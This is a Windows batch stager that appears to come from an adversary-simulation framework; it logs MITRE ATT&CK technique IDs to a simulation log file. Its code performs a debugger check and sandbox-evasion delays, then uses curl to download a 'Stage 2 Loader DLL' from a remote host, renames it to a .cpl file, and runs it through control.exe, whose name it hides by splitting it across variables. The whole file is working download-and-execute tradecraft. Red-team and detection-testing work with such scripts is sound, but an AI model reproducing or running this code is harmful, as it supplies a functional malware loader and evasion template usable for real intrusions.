@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_* placeholder assignments (random-named SET variables)
SET douyiw=%APPDATA%\10959\88eb376a
SET qmzxkp=b9b80d7a.txt
SET akjvnm=https://10.0.0.49/stage/2/icon.png?10959-7
SET jhfgsd=BALAM-S2BO
SET lkjhgf=10959
SET poiuy=7
SET mnbvcx=%PUBLIC%\\macula-simulations.log
SET qwerty=https://10.0.0.49

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM ----------------------------------------------------------------------
REM 1. Initial anti-analysis (Debugger.IsAttached check)
REM ----------------------------------------------------------------------
for /f "tokens=*" %%a in ('powershell -NoProfile -Command "[System.Diagnostics.Debugger]::IsAttached" 2^>nul') do set dattach=%%a
if "!dattach!"=="True" (
    SET /A sleeptime=!RANDOM! %% 3001 + 2000
    timeout /t !sleeptime! /nobreak >nul
)
echo [!tsvar!][DEBUG][!jhfgsd!][!lkjhgf!]: debugger_check>> "!mnbvcx!" 2>nul

REM ----------------------------------------------------------------------
REM 2. Initial delay (10-20s)
REM ----------------------------------------------------------------------
timeout /t 15 /nobreak >nul

REM ----------------------------------------------------------------------
REM 3. Heartbeat fetch (download Stage 2 Loader DLL)
REM ----------------------------------------------------------------------
echo [!tsvar!][DEBUG][!jhfgsd!][!lkjhgf!]: heartbeat_start>> "!mnbvcx!" 2>nul
curl -k -s -o "!douyiw!\!qmzxkp!" "!akjvnm!"
echo [!tsvar!][DEBUG][!jhfgsd!][!lkjhgf!]: heartbeat_complete>> "!mnbvcx!" 2>nul
echo [!tsvar!][TTP][!jhfgsd!][!lkjhgf!]: T1218^|System Binary Proxy Execution=OK:>> "!mnbvcx!" 2>nul

REM Log TTP for download (T1497 partially, T1027 later)
echo [!tsvar!][TTP][!jhfgsd!][!lkjhgf!]: T1497^|Virtualization/Sandbox Evasion=OK:>> "!mnbvcx!" 2>nul

REM ----------------------------------------------------------------------
REM 4. Delays between operations (mix of methods)
REM ----------------------------------------------------------------------
ping -n 5 127.0.0.1 >nul
for /l %%i in (1,1,8) do timeout /t 1 /nobreak >nul

REM ----------------------------------------------------------------------
REM 5. Change to output directory
REM ----------------------------------------------------------------------
echo [!tsvar!][DEBUG][!jhfgsd!][!lkjhgf!]: chdir_start>> "!mnbvcx!" 2>nul
cd /d "!douyiw!" >nul 2>&1
echo [!tsvar!][DEBUG][!jhfgsd!][!lkjhgf!]: chdir_result=0>> "!mnbvcx!" 2>nul

REM ----------------------------------------------------------------------
REM 6. Rename downloaded file to .cpl (Stage 2 Loader DLL)
REM ----------------------------------------------------------------------
echo [!tsvar!][DEBUG][!jhfgsd!][!lkjhgf!]: rename_start>> "!mnbvcx!" 2>nul
FOR %%i IN ("!qmzxkp!") DO SET basecpl=%%~ni
ren "!douyiw!\!qmzxkp!" "!basecpl!.cpl"
echo [!tsvar!][DEBUG][!jhfgsd!][!lkjhgf!]: rename_result=0>> "!mnbvcx!" 2>nul

REM ----------------------------------------------------------------------
REM 7. Variable indirection obfuscation for LOLBIN (control.exe)
REM ----------------------------------------------------------------------
SET a1=con
SET b2=trol
SET c3=.e
SET d4=xe
SET fullbin=%a1%%b2%%c3%%d4%
SET binref=fullbin
CALL SET execbin=%%!binref!%%

REM Additional delay before invocation
SET /A rdelay=!RANDOM! %% 20 + 10
timeout /t !rdelay! /nobreak >nul

REM ----------------------------------------------------------------------
REM 8. Execute Stage 2 Loader DLL via control.exe (LOLBIN proxy)
REM ----------------------------------------------------------------------
echo [!tsvar!][DEBUG][!jhfgsd!][!lkjhgf!]: controlexec_start>> "!mnbvcx!" 2>nul
!execbin! "!douyiw!\!basecpl!.cpl"
echo [!tsvar!][DEBUG][!jhfgsd!][!lkjhgf!]: controlexec_result=%errorlevel%>> "!mnbvcx!" 2>nul
echo [!tsvar!][TTP][!jhfgsd!][!lkjhgf!]: T1027^|Obfuscated Files or Information=OK:>> "!mnbvcx!" 2>nul

REM Wait before exit (sandbox evasion)
ping -n 10 127.0.0.1 >nul

EXIT /B 0